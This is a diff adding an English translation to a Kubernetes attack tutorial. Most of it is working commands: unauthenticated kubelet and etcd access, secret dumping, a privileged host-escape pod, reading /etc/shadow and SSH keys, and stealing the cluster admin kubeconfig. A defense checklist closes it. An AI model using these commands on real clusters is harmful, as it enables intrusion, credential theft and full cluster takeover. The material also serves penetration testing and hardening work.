@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # Kubernetes 공격: 클러스터 침투 및 권한 탈취
 
 ## 1. Kubernetes 보안 아키텍처 이해
@@ -1085,3 +1091,295 @@ kubectl --kubeconfig /tmp/stolen-kubeconfig get all --all-namespaces
 | kubelet 인증 강화 | `--anonymous-auth=false`, `--authorization-mode=Webhook` |
 | API 서버 감사 로그 | `--audit-log-path`, `--audit-policy-file` 설정 |
 | 이미지 서명 검증 | Sigstore/cosign + OPA Gatekeeper |
+
+---
+
+<a name="english"></a>
+
+# Kubernetes Attacks: Cluster Penetration and Privilege Escalation
+
+## 1. Understanding Kubernetes Security Architecture
+
+```
+kube-apiserver  ←─ Central hub of all control traffic
+├── etcd          ← Stores cluster state (all tokens, secrets)
+├── kube-scheduler
+├── kube-controller-manager
+└── cloud-controller-manager
+
+Node Components
+├── kubelet       ← Per-node agent (API: :10250, :10255)
+├── kube-proxy
+└── Container Runtime (containerd, CRI-O)
+
+Attack Surface
+├── kube-apiserver (6443/8080)
+├── etcd (2379/2380)
+├── kubelet API (10250 authenticated, 10255 unauthenticated read-only)
+├── Dashboard (8001)
+└── ServiceAccount tokens (/var/run/secrets/kubernetes.io/serviceaccount/)
+```
+
+---
+
+## 2. Initial Access Vectors
+
+### 2.1 Exposed kube-apiserver
+
+```bash
+# Attempt to access API server without authentication
+curl https://TARGET:6443/api/v1/namespaces --insecure
+curl http://TARGET:8080/api/v1/namespaces    # legacy unauthenticated port
+
+# kubectl anonymous access
+kubectl --server=https://TARGET:6443 --insecure-skip-tls-verify \
+  get pods --all-namespaces
+
+# Access with service account token
+kubectl --server=https://TARGET:6443 \
+  --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) \
+  --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
+  get pods
+```
+
+### 2.2 Unauthenticated kubelet API Access
+
+```bash
+# Port 10255: read-only (no auth required, legacy configuration)
+curl http://NODE_IP:10255/pods
+curl http://NODE_IP:10255/metrics
+curl http://NODE_IP:10255/stats/summary
+
+# Port 10250: requires auth, but accessible when anonymousAuth=true
+curl --insecure https://NODE_IP:10250/pods
+curl --insecure https://NODE_IP:10250/run/default/TARGET_POD/TARGET_CONTAINER \
+  -X POST \
+  -d "cmd=id"
+
+# Execute commands in container (when anonymous access is available)
+curl --insecure -X POST \
+  "https://NODE_IP:10250/run/kube-system/coredns-xxxxx/coredns" \
+  -d "cmd=cat /etc/resolv.conf"
+```
+
+### 2.3 Direct etcd Access
+
+```bash
+# Unauthenticated etcd (port 2379)
+etcdctl --endpoints=http://ETCD_IP:2379 get / --prefix --keys-only
+etcdctl --endpoints=http://ETCD_IP:2379 get /registry --prefix --keys-only
+
+# Dump all secrets
+etcdctl --endpoints=http://ETCD_IP:2379 get /registry/secrets --prefix -w json
+
+# Extract ServiceAccount tokens
+etcdctl --endpoints=http://ETCD_IP:2379 \
+  get /registry/secrets/kube-system --prefix -w json | \
+  python3 -c "import sys,json; data=json.load(sys.stdin); \
+  [print(item['key']) for item in data.get('kvs',[])]"
+
+# When TLS is required
+etcdctl --endpoints=https://ETCD_IP:2379 \
+  --cert=/etc/kubernetes/pki/etcd/server.crt \
+  --key=/etc/kubernetes/pki/etcd/server.key \
+  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
+  get /registry/secrets --prefix --keys-only
+```
+
+---
+
+## 3. Exploiting RBAC Misconfigurations
+
+### 3.1 Dangerous RBAC Permissions
+
+```yaml
+# Example of excessive ClusterRoleBinding (vulnerable configuration)
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: dangerous-binding
+subjects:
+- kind: ServiceAccount
+  name: default
+  namespace: default
+roleRef:
+  kind: ClusterRole
+  name: cluster-admin     # ← Dangerous: grants all permissions
+  apiGroup: rbac.authorization.k8s.io
+```
+
+```bash
+# Check current permissions
+kubectl auth can-i --list
+kubectl auth can-i get secrets --all-namespaces
+kubectl auth can-i create pods
+kubectl auth can-i '*' '*'  # wildcard
+
+# Check specific SA permissions
+kubectl auth can-i list secrets \
+  --as=system:serviceaccount:default:default
+
+# Enumerate RBAC across the cluster
+kubectl get clusterrolebindings -o json | \
+  python3 -c "
+import json, sys
+data = json.load(sys.stdin)
+for item in data['items']:
+    subjects = item.get('subjects', [])
+    role = item['roleRef']['name']
+    for s in subjects:
+        print(f\"{role} → {s.get('kind')}:{s.get('namespace','')}/{s.get('name')}\")
+"
+```
+
+### 3.2 List of Dangerous Permissions
+
+```bash
+# pods/exec: execute commands in container
+kubectl exec -it <pod> -- /bin/sh
+
+# secrets: read all secrets
+kubectl get secrets --all-namespaces -o json
+
+# create pods: create Pod for privilege escalation
+kubectl apply -f - <<EOF
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pwn-pod
+spec:
+  hostPID: true
+  hostNetwork: true
+  containers:
+  - name: pwn
+    image: ubuntu
+    command: ["/bin/sh", "-c", "nsenter -t 1 -m -u -i -n -- bash"]
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: host-root
+  volumes:
+  - name: host-root
+    hostPath:
+      path: /
+EOF
+
+# nodes: view node info (internal IPs, etc.)
+kubectl get nodes -o wide
+```
+
+---
+
+## 4. ServiceAccount Token Theft and Lateral Movement
+
+### 4.1 Using Tokens from Inside a Pod
+
+```bash
+# Auto-mounted SA tokens
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+APISERVER=https://kubernetes.default.svc
+
+# Call API server
+curl --cacert $CACERT \
+  -H "Authorization: Bearer $TOKEN" \
+  $APISERVER/api/v1/namespaces/default/pods
+
+# Steal secrets from another namespace (when authorized)
+curl --cacert $CACERT \
+  -H "Authorization: Bearer $TOKEN" \
+  $APISERVER/api/v1/namespaces/kube-system/secrets
+```
+
+---
+
+## 5. Pod Security Misconfiguration Exploitation
+
+### 5.1 hostPath Volume Abuse
+
+```bash
+# Create Pod that can access host files via hostPath
+kubectl apply -f - <<EOF
+apiVersion: v1
+kind: Pod
+metadata:
+  name: host-reader
+spec:
+  containers:
+  - name: reader
+    image: ubuntu
+    command: ["sleep", "3600"]
+    volumeMounts:
+    - mountPath: /host-etc
+      name: host-etc
+    - mountPath: /host-home
+      name: host-home
+  volumes:
+  - name: host-etc
+    hostPath:
+      path: /etc
+  - name: host-home
+    hostPath:
+      path: /root
+EOF
+
+kubectl exec -it host-reader -- cat /host-etc/shadow
+kubectl exec -it host-reader -- cat /host-home/.ssh/id_rsa
+```
+
+---
+
+## 7. Real Attack Scenarios
+
+### Scenario 1: SA Token → cluster-admin Privilege Escalation
+
+```bash
+# 1. Obtain SA token from inside the Pod
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+
+# 2. Check current permissions
+kubectl auth can-i --list --token=$TOKEN
+
+# 3. When create pods permission exists → create privilege escalation Pod
+kubectl apply -f privesc-pod.yaml --token=$TOKEN
+
+# 4. Access host from privileged Pod
+kubectl exec -it privesc-pod -- chroot /host
+
+# 5. Steal kubeconfig from host
+cat /etc/kubernetes/admin.conf
+```
+
+### Scenario 2: etcd → Full Cluster Takeover
+
+```bash
+# Extract admin client certificate from etcd
+etcdctl get /registry/secrets/kube-system/admin-cert --print-value-only | \
+  python3 -c "
+import sys, json, base64
+data = sys.stdin.read()
+# etcd uses protobuf encoding, so a parser is actually required
+print(data[:200])
+"
+
+# Or directly steal from /etc/kubernetes/pki on the control plane node
+ssh control-plane-node
+cat /etc/kubernetes/admin.conf > /tmp/stolen-kubeconfig
+kubectl --kubeconfig /tmp/stolen-kubeconfig get all --all-namespaces
+```
+
+---
+
+## 8. Defense Checklist
+
+| Item | Configuration |
+|------|--------------|
+| RBAC Least Privilege | Specify only required resources/verbs in ClusterRole |
+| Disable SA Token Auto-mount | `automountServiceAccountToken: false` |
+| Apply NetworkPolicy | Default deny-all policy in all namespaces |
+| PodSecurity Admission | Enforce `restricted` profile |
+| etcd Encryption | Encrypt secrets with EncryptionConfiguration |
+| Kubelet Auth Hardening | `--anonymous-auth=false`, `--authorization-mode=Webhook` |
+| API Server Audit Logging | Configure `--audit-log-path`, `--audit-policy-file` |
+| Image Signature Verification | Sigstore/cosign + OPA Gatekeeper |
